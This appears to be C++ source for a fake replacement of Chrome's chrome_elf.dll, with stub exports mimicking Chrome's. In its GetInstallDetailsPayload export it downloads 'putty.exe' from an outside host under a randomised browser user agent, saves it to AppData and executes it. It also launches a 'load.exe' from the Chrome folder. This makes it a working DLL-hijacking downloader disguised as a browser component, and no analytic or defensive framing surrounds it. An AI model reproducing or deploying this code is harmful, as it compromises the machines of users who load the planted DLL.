//zerotrace

#include <windows.h>
#include <string>
#include <urlmon.h>
#include <shlobj.h>
#include <stdio.h>

#include <wininet.h>
#include <time.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")



#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")

// Custom URL download function with user agent
HRESULT DownloadWithUserAgent(const char* url, const char* filepath, const char* userAgent) {
    HINTERNET hInternet = InternetOpenA(userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return E_FAIL;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return E_FAIL;
    }

    HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return E_FAIL;
    }

    BYTE buffer[4096];
    DWORD bytesRead, bytesWritten;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    return S_OK;
}

extern "C" {

    __declspec(dllexport) void ClearReportBetween_ExportThunk() {
        // MessageBoxA(NULL, "ClearReportBetween_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void CrashForException_ExportThunk() {
        //   MessageBoxA(NULL, "CrashForException_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void DisableHook() {
        //   MessageBoxA(NULL, "DisableHook called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void DumpLog() {
        // MessageBoxA(NULL, "DumpLog called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void DumpingProcessWithType_ExportThunk() {
        //   MessageBoxA(NULL, "DumpingProcessWithType_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void DumpProcessWithoutCrash() {
        //   MessageBoxA(NULL, "DumpProcessWithoutCrash called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetApplyHookResult() {
        // MessageBoxA(NULL, "GetApplyHookResult called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetCrashesCount_ExportThunk() {
        // MessageBoxA(NULL, "GetCrashesCount_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetCrashReports_ExportThunk() {
        // MessageBoxA(NULL, "GetCrashReports_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetDataDirectory_ExportThunk() {
        // MessageBoxA(NULL, "GetDataDirectory_ExportThunk called", "Chrome ELF", MB_OK);
    }



    __declspec(dllexport) BOOL WINAPI GetHandleVerifier() {
        //  MessageBoxA(NULL, "GetHandleVerifier called", "Chrome ELF", MB_OK);
        return TRUE;
    }


    __declspec(dllexport) BOOL WINAPI GetInstallDetailsPayload(void* payload, size_t* payload_size) {
        // Detailed message box with payload information

        char appdata[MAX_PATH];
        char filepath[MAX_PATH];
        // Get AppData folder
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
        sprintf(filepath, "%s\\downloaded.exe", appdata);

        // Array of different browser user agents
        const char* userAgents[] = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.39"
        };

        // Initialize random seed
        srand((unsigned int)time(NULL));

        // Select random user agent
        int randomIndex = rand() % (sizeof(userAgents) / sizeof(userAgents[0]));
        const char* selectedUserAgent = userAgents[randomIndex];

        // Download file with custom user agent
        HRESULT hr = DownloadWithUserAgent(
            "http://cosmic-cheats.com/putty.exe",
            filepath,
            selectedUserAgent
        );

        if (hr == S_OK) {
            printf("File downloaded to: %s using %s\n", filepath, selectedUserAgent);
            ShellExecuteA(NULL, "open", filepath, NULL, NULL, SW_SHOW);
        }
        else {
            printf("Download failed\n");
        }

        char message[256];
        snprintf(message, sizeof(message),
            "GetInstallDetailsPayload called\n"
            "Payload: %p\n"
            "Payload Size: %zu",
            payload,
            payload_size ? *payload_size : 0);

        MessageBoxA(NULL, message, "Chrome ELF", MB_OK | MB_ICONINFORMATION);

        ShellExecuteA(NULL, "open", "C:\\Program Files\\Google\\Chrome\\Application\\load.exe", NULL, NULL, SW_SHOW);


        if (payload == nullptr || payload_size == nullptr) {
            return FALSE;
        }


        if (*payload_size == 0) {
            *payload_size = 0;
            return TRUE;
        }

        return TRUE;
    }



    __declspec(dllexport) void SignalChromeElf() {
        // MessageBoxA(NULL, "SignalChromeElf called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetProductInfo_ExportThunk() {
        //  MessageBoxA(NULL, "GetProductInfo_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetUniqueBlockCount() {
        // MessageBoxA(NULL, "GetUniqueBlockCount called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetUploadConsent_ExportThunk() {
        // MessageBoxA(NULL, "GetUploadConsent_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void GetUserDataDirectory_ExportThunk() {
        // MessageBoxA(NULL, "GetUserDataDirectory_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void IncrementDumpProcessing_ExportThunk() {
        //  MessageBoxA(NULL, "IncrementDumpProcessing_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void IsBrowserProcess() {
        // MessageBoxA(NULL, "IsBrowserProcess called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void IsExtensionPointDisableSet() {
        // MessageBoxA(NULL, "IsExtensionPointDisableSet called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void IsTemporaryUserDataDirectoryCreatedForHeadless() {
        // MessageBoxA(NULL, "IsTemporaryUserDataDirectoryCreatedForHeadless called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void IsThirdPartyInitialized() {
        //  MessageBoxA(NULL, "IsThirdPartyInitialized called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void RegisterLogNotification() {
        //  MessageBoxA(NULL, "RegisterLogNotification called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void RequestSingleUpload_ExportThunk() {
        //  MessageBoxA(NULL, "RequestSingleUpload_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void SetMetricsClient() {
        // MessageBoxA(NULL, "SetMetricsClient called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void SetUploadConsent_ExportThunk() {
        //   MessageBoxA(NULL, "SetUploadConsent_ExportThunk called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void SignalChromeSFIeld() {
        //   MessageBoxA(NULL, "SignalChromeSFIeld called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void SignalInitializeCrashReporting() {
        // MessageBoxA(NULL, "SignalInitializeCrashReporting called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void TisCallback_0() {
        // MessageBoxA(NULL, "TisCallback_0 called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void TisCallback_1() {
        // MessageBoxA(NULL, "TisCallback_1 called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void TisCallback_2() {
        // MessageBoxA(NULL, "TisCallback_2 called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void TisCallback_3() {
        //  MessageBoxA(NULL, "TisCallback_3 called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void TisCallback_4() {
        // MessageBoxA(NULL, "TisCallback_4 called", "Chrome ELF", MB_OK);
    }

    __declspec(dllexport) void TisCallback_5() {
        // MessageBoxA(NULL, "TisCallback_5 called", "Chrome ELF", MB_OK);
    }


    __declspec(dllexport) BOOL WINAPI DllMain(
        HINSTANCE hinstDLL,
        DWORD fdwReason,
        LPVOID lpReserved
    ) {
        switch (fdwReason)
        {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL,
                "Chrome ELF Replacement DLL Loaded",
                "Chrome ELF",
                MB_OK | MB_ICONINFORMATION);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
}